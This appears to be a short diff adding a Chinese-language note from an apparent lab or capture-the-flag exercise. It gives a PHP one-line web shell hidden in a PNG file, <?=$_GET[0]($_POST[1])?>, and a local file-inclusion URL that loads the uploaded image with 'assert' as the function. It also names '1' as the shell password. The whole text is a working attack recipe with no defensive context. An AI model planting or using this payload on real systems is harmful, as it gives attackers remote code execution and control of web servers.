@@ -1,0 +1,8 @@
+
+png格式中的一句话为<?=$_GET[0]($_POST[1])?>
+
+
+http://127.0.0.1/include.php?file=upload/9179.png&0=assert
+
+密码1
+
